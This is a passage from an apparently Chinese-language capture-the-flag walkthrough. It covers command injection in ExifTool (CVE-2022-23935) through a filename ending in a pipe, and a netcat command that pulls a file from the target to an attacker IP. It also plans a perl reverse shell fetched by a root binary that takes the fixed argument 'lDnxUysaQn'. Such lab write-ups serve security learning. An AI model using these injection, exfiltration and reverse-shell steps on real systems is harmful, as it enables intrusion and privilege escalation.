搜索找到一个12.38版本前的漏洞CVE-2022-23935，可以进行利用，可以参考这篇文章 Command Injection in Exiftool before 12.38 (github.com)^(\[1\]) 漏洞原理就是当文件名以|结尾时，exiftool将|识别为管道符从而认为文件名是系统命令，进而执行

## 切换用户

拿到的是www-data的shell，权限很低，接下来要做的就是切换到smorton用户 在/usr/local目录下发现一个Investigation目录，进去后发现一个Windows Event Logs for Analysis.msg文件，把它下到本机进行分析

```
本地执行nc -lvnp 9999 > 'Windows Event Logs for Analysis.msg'
靶机上执行nc 10.10.16.10 9999 < Windows\ Event\ Logs\ for\ Analysis.msg
```

可以看到程序首先判断输入参数的个数是否为3个，其中程序名是第一个参数，所以我们要输入的数据是两个，然后判断是否以root身份运行程序，再然后第三个参数需要为lDnxUysaQn，之后调用了curl\_easy\_setopt()函数，对第二个参数进行curl，所以第二个参数应该是一个网址或者文件，之后会用perl进行读取执行，这样利用方式就显而易见了，只需在本机上创建一个perl的反弹shell，再用binary文件读取执行即可。第三个参数 固定是 `lDnxUysaQn`
